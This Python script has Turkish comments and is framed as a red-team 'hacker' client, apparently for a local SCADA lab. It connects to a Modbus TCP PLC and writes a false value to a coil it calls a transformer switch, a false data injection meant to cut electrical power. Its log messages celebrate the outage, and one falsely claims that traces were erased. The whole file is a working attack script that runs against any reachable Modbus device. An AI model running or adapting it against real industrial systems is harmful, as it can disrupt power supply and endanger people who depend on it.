import logging
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException

# Hacker terminali hissiyatı vermesi için log formatını biraz özelleştirdik
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [🔥 SALDIRI] %(message)s",
    datefmt="%H:%M:%S"
)

def fdia_saldirisi_baslat(host: str = '127.0.0.1', port: int = 502) -> None:
    """
    Kırmızı Takım (Hacker) İstemcisi: SCADA ağına sızar ve 
    yetkisiz bir şekilde hedef şalterin (Coil) değerini manipüle eder.
    """
    logging.info(f"Hedef sisteme ({host}:{port}) sizilmaya calisiliyor...")
    
    # 1. AĞA SIZMA: SCADA istemcisi gibi davranarak PLC'ye bağlanıyoruz
    client = ModbusTcpClient(host, port=port)

    try:
        if client.connect():
            logging.info("Hedef agina sizildi! TCP kapisi (Port 502) acik.")
            
            # 2. ZEHİRLİ PAKET ENJEKSİYONU (Function Code 5: Write Single Coil)
            # Normalde operatör '1' (True) yapmıştı. Biz ağa sahte '0' (False) gönderiyoruz!
            logging.info("Zehirli paket (FDIA) hazirlaniyor: Trafo Salteri = FALSE yapilacak!")
            result = client.write_coil(address=0, value=False)
            
            # 3. SONUÇ RAPORU
            if not result.isError():
                logging.info("💥 BOOOM! Zehirli paket basariyla enjekte edildi! Sistemin elektrigi kesildi!")
            else:
                logging.error("Saldiri basarisiz oldu. Sistem korumali (Firewall) olabilir.")
        else:
            logging.error("Baglanti reddedildi! Hedef sistem kapali.")
            
    except ModbusException as e:
        logging.error(f"Baglanti koptu: {e}")
        
    finally:
        client.close()
        logging.info("🕵️ Izler silindi. Aghtan cikis yapildi.")

if __name__ == "__main__":
    fdia_saldirisi_baslat()